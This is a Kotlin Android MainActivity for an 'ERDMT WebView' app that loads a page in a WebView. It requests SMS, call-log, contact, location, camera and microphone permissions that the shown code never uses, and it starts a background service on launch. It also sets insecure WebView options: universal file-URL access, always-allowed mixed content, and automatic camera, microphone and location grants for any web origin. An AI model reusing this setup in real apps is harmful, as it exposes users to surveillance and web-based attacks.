package com.yourdomain.erdmt

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.webkit.*
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.appbar.MaterialToolbar
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.google.android.material.progressindicator.LinearProgressIndicator
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.analytics.FirebaseAnalytics
import java.io.File

class MainActivity : AppCompatActivity() {
    
    private lateinit var webView: WebView
    private lateinit var progressBar: LinearProgressIndicator
    private lateinit var errorLayout: View
    private lateinit var errorMessage: TextView
    private lateinit var permissionCard: MaterialCardView
    private lateinit var permissionStatus: TextView
    private lateinit var requestPermissionsBtn: MaterialButton
    private lateinit var toolbar: MaterialToolbar
    private lateinit var fab: FloatingActionButton
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    
    private var fileUploadCallback: ValueCallback<Array<Uri>>? = null
    private val FILE_CHOOSER_REQUEST_CODE = 1001
    
    // All required permissions
    private val ALL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )
    } else {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }
    
    // Permission launcher
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        updatePermissionStatus()
        val deniedPermissions = permissions.filterValues { !it }
        if (deniedPermissions.isNotEmpty()) {
            showSnackbar("Some permissions were denied. App functionality may be limited.")
        } else {
            showSnackbar("All permissions granted successfully!")
        }
    }
    
    // File chooser launcher
    private val fileChooserLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            val data = result.data
            val results = if (data?.data != null) {
                arrayOf(data.data!!)
            } else {
                null
            }
            fileUploadCallback?.onReceiveValue(results)
        } else {
            fileUploadCallback?.onReceiveValue(null)
        }
        fileUploadCallback = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Initialize Firebase Analytics
        firebaseAnalytics = FirebaseAnalytics.getInstance(this)
        
        initializeViews()
        setupToolbar()
        setupWebView()
        setupClickListeners()
        
        // Check and request permissions
        updatePermissionStatus()
        
        // Load initial URL
        loadWebPage()
        
        // Start background service
        startBackgroundService()
    }
    
    private fun initializeViews() {
        webView = findViewById(R.id.webView)
        progressBar = findViewById(R.id.progressBar)
        errorLayout = findViewById(R.id.errorLayout)
        errorMessage = findViewById(R.id.errorMessage)
        permissionCard = findViewById(R.id.permissionCard)
        permissionStatus = findViewById(R.id.permissionStatus)
        requestPermissionsBtn = findViewById(R.id.requestPermissionsBtn)
        toolbar = findViewById(R.id.toolbar)
        fab = findViewById(R.id.fab)
    }
    
    private fun setupToolbar() {
        setSupportActionBar(toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(false)
    }
    
    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val webSettings = webView.settings
        
        // Enable JavaScript
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        
        // Enable DOM storage
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        
        // Enable file access
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true
        webSettings.allowFileAccessFromFileURLs = true
        webSettings.allowUniversalAccessFromFileURLs = true
        
        // Media settings
        webSettings.mediaPlaybackRequiresUserGesture = false
        
        // Cache settings
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        webSettings.setAppCacheEnabled(true)
        
        // Zoom settings
        webSettings.setSupportZoom(true)
        webSettings.builtInZoomControls = true
        webSettings.displayZoomControls = false
        
        // Mixed content
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        
        // User agent
        webSettings.userAgentString = webSettings.userAgentString + " ERDMTWebView/1.0"
        
        // Set WebView client
        webView.webViewClient = CustomWebViewClient()
        webView.webChromeClient = CustomWebChromeClient()
        
        // Add JavaScript interface
        webView.addJavascriptInterface(WebAppInterface(), "Android")
    }
    
    private fun setupClickListeners() {
        requestPermissionsBtn.setOnClickListener {
            requestAllPermissions()
        }
        
        fab.setOnClickListener {
            webView.reload()
        }
        
        findViewById<MaterialButton>(R.id.retryBtn).setOnClickListener {
            loadWebPage()
        }
    }
    
    private fun loadWebPage() {
        hideError()
        showProgress()
        webView.loadUrl("https://www.google.com")
    }
    
    private fun requestAllPermissions() {
        val neededPermissions = ALL_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        
        if (neededPermissions.isNotEmpty()) {
            permissionLauncher.launch(neededPermissions)
        } else {
            showSnackbar("All permissions are already granted!")
        }
    }
    
    private fun updatePermissionStatus() {
        val grantedCount = ALL_PERMISSIONS.count {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        
        val statusText = "$grantedCount/${ALL_PERMISSIONS.size} permissions granted"
        permissionStatus.text = statusText
        
        if (grantedCount == ALL_PERMISSIONS.size) {
            permissionStatus.setTextColor(ContextCompat.getColor(this, R.color.success))
            requestPermissionsBtn.visibility = View.GONE
        } else {
            permissionStatus.setTextColor(ContextCompat.getColor(this, R.color.warning))
            requestPermissionsBtn.visibility = View.VISIBLE
        }
    }
    
    private fun showProgress() {
        progressBar.visibility = View.VISIBLE
    }
    
    private fun hideProgress() {
        progressBar.visibility = View.GONE
    }
    
    private fun showError(message: String) {
        errorMessage.text = message
        errorLayout.visibility = View.VISIBLE
        webView.visibility = View.GONE
    }
    
    private fun hideError() {
        errorLayout.visibility = View.GONE
        webView.visibility = View.VISIBLE
    }
    
    private fun showSnackbar(message: String) {
        Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_LONG).show()
    }
    
    private fun startBackgroundService() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
    
    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }
    
    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_refresh -> {
                webView.reload()
                true
            }
            R.id.action_permissions -> {
                requestAllPermissions()
                true
            }
            R.id.action_settings -> {
                showSnackbar("Settings coming soon!")
                true
            }
            R.id.action_about -> {
                showSnackbar("ERDMT WebView v1.0")
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }
    
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
    
    // Custom WebView Client
    private inner class CustomWebViewClient : WebViewClient() {
        
        override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
            super.onPageStarted(view, url, favicon)
            showProgress()
            hideError()
        }
        
        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            hideProgress()
        }
        
        override fun onReceivedError(
            view: WebView?,
            request: WebResourceRequest?,
            error: WebResourceError?
        ) {
            super.onReceivedError(view, request, error)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                showError("Error: ${error?.description}")
            } else {
                showError("Network error occurred")
            }
            hideProgress()
        }
        
        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            return false // Let WebView handle all URLs
        }
    }
    
    // Custom WebChrome Client
    private inner class CustomWebChromeClient : WebChromeClient() {
        
        override fun onProgressChanged(view: WebView?, newProgress: Int) {
            super.onProgressChanged(view, newProgress)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                progressBar.setProgress(newProgress, true)
            } else {
                progressBar.progress = newProgress
            }
        }
        
        override fun onReceivedTitle(view: WebView?, title: String?) {
            super.onReceivedTitle(view, title)
            toolbar.title = title ?: "ERDMT WebView"
        }
        
        // Handle file upload
        override fun onShowFileChooser(
            webView: WebView?,
            filePathCallback: ValueCallback<Array<Uri>>?,
            fileChooserParams: FileChooserParams?
        ): Boolean {
            fileUploadCallback = filePathCallback
            
            val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "*/*"
                putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            }
            
            fileChooserLauncher.launch(Intent.createChooser(intent, "Choose File"))
            return true
        }
        
        // Handle geolocation permission
        override fun onGeolocationPermissionsShowPrompt(
            origin: String?,
            callback: GeolocationPermissions.Callback?
        ) {
            callback?.invoke(origin, true, false)
        }
        
        // Handle camera/microphone permission
        override fun onPermissionRequest(request: PermissionRequest?) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                request?.grant(request.resources)
            }
        }
    }
    
    // JavaScript Interface
    private inner class WebAppInterface {
        @JavascriptInterface
        fun showToast(message: String) {
            runOnUiThread {
                showSnackbar(message)
            }
        }
        
        @JavascriptInterface
        fun getDeviceInfo(): String {
            return """
                {
                    "model": "${Build.MODEL}",
                    "manufacturer": "${Build.MANUFACTURER}",
                    "version": "${Build.VERSION.RELEASE}",
                    "sdk": ${Build.VERSION.SDK_INT}
                }
            """.trimIndent()
        }
    }
}